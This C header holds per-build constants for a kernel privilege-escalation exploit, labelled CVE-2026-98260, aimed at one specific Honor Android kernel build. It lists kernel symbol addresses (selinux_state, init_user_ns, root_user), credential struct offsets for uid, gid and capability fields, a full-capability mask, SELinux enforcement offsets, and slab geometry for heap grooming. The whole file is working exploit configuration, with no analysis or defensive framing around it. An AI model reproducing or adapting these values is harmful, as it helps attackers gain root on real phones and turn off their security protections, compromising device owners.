/* pc98260_target_g856.h — CVE-2026-98260 per-build constants.
 *
 * Target: Honor 6.12.23 gd85666d7884 (boot_ota_1793682544248.img)
 *   kernel_release = 6.12.23-android16-5-gcd85666d7884-abogki452537391-4k
 *   4K pages, VA_BITS=39
 *
 * Derived from the supplied boot image:
 *   - vmlinux-to-elf .symtab
 *   - .BTF for struct geometry
 *   - disassembly for allocation call sites / begin_new_exec offsets
 */
#ifndef PC98260_TARGET_G856_H
#define PC98260_TARGET_G856_H

#include <stdint.h>

#define TARGET_NAME          "honor-6123-g856"
#define TARGET_KERNEL        "6.12.23-android16-5-gcd85666d7884-abogki452537391-4k"
#define TARGET_KERNEL_SHA256 "146721ce67fbe5d16fbb7c2d41db2fbf9ff30f8ffb85b2ae0ee83bb316159053"

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc082656570)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc0823f1360)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc0823f15d8)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc0823f2aa0)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc0823f2f70)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites (function-internal; NOT portable) --- */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc080cb8b60)  /* do_timer_create+0xac */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc080df5358)  /* prepare_creds+0x2c  */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc080d03ae4)  /* copy_process task alloc return */

/* ---- struct geometry (g856 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x900
#define GEO_TASK_REAL_CRED   0x8f8
#define GEO_TASK_COMM        0x910
#define GEO_KITIMER_IT       0x78
#define GEO_KITIMER_SIZE     0x100
#define GEO_KITIMER_STRIDE   0x100
#define GEO_CRED_SIZE        184
#define GEO_CRED_ALLOC_SIZE  192
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry (task_struct 0x1440; 8-page slab, 6 objects) ----- */
#define GEO_TASK_OBJSIZE            5184
#define GEO_TASK_OBJ_PER_SLAB       6
#define GEO_TASK_SLAB_PAGES         8
#define GEO_POSIX_TIMER_OBJSIZE     256
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 32
#define GEO_POSIX_TIMER_SLAB_ORDER  1
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000)
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc0817e5cd8)

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff)

/* ---- begin_new_exec cleanup offsets (vulnerability check) ----------- */
#define BNE_LINK              UINT64_C(0xffffffc080cffbb0)
#define BNE_RELEASE_TASK_OFF  0xa48
#define BNE_DOWN_READ_OFF     0x168
#define BNE_TIMERS_EXIT_OFF   0x2a0
#define BNE_EXIT_ITIMERS_OFF  0x2b0

#endif /* PC98260_TARGET_G856_H */
